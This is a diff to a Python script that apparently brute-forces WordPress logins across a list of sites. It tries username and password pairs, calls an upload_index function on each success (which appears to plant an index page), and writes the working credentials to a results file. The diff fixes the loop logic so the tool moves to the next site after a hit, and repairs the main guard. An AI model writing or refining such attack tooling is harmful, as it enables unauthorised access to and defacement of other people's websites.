@@ -55,15 +55,16 @@ def main():
                 if upload_index(wp_url, username, password):
                     print(f"[+] Success: {wp_url} with {username}/{password}")
                     success_results.append(f"{wp_url} - {username}/{password}")
-                    break
-                else:
-                    print(f"[-] Failed: {wp_url} with {username}/{password}")
-    
+                    break  # Break only the password loop to move to next username
+            else:
+                continue  # If no password works, continue to next wp_url
+            break  # Break the username loop to move to next wp_url
+
     with open(result_file, 'w') as file:
         for result in success_results:
             file.write(result + "\n")
     
     print(f"[+] Results saved to {result_file}")
 
-if name == 'main':
+if __name__ == '__main__':
     main()
